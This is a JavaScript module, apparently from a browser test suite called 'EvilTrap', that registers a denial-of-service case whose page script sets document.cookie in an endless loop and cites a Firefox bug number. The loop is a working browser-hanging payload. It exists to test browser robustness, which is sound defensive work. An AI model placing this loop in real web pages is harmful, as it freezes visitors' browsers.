const EvilTrap = require('../../EvilTrap');


module.exports = new EvilTrap('document.cookie DoS', EvilTrap.CATEGORY.DOS, 'Setting document.cookie in a loop spams the browser.', { firefox: '1520489' })
  .addScriptPage(() => {
    // eslint-disable-next-line no-constant-condition
    while (true) {
      document.cookie = 'a=b;';
    }
  });
